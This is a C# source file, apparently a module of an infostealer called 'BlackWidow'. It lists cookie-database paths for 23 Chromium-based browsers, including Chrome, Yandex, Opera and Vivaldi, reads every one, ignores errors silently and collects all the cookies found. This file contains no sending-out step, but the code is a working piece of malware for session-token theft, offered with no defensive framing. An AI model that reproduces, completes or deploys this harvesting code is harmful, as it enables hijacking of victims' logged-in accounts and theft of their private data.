using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackWidow.Cookie
{
    class ChromiumCookie
    {
        public static List<CookieChromium> GetCookies()
        {
            List<CookieChromium> cookiesBrowser = new List<CookieChromium>();
            string[] pathBrowser =
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Comodo\\Dragon\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Orbitum\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Torch\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Kometa\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Amigo\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Vivaldi\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Nichrome\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Maxthon5\\Users\\guest\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Epic Privacy Browser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CocCoc\\Browser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "360Browser\\Browser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Sputnik\\Sputnik\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "uCozMedia\\Uran\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CentBrowser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "7Star\\7Star\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Elements Browser\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Superbird\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Chedot\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Suhba\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Rafotech\\Mustang\\User Data\\Default\\Cookies")
            };

            //List<CookieChromium> allCookies = new List<CookieChromium>();

            for (int i = 0; i < pathBrowser.Length; i++)
            {
                List<CookieChromium> allCookies = new List<CookieChromium>();
                try
                {
                    allCookies = ChromiumCookieBase.GetCookie(pathBrowser[i]);
                }
                catch
                {
                }

                if (allCookies != null)
                {
                    cookiesBrowser.AddRange(allCookies);
                }
            }
            return cookiesBrowser;
        }
    }
}
